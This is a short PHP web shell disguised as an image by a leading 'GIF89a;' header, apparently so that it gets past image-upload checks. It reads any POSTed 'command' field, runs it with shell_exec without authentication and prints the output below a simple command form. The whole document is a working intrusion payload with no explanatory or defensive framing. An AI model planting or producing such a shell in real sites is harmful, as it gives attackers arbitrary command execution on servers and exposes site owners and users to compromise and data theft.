GIF89a;

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the command from the form
    $command = $_POST["command"];

    // Execute the command and capture output
    $output = shell_exec($command);

    // Display the output
    echo "<pre>$output</pre>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
</head>
<body>
    <h2>Execute Command</h2>
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
        <label for="command">Enter command:</label><br>
        <input type="text" id="command" name="command"><br><br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>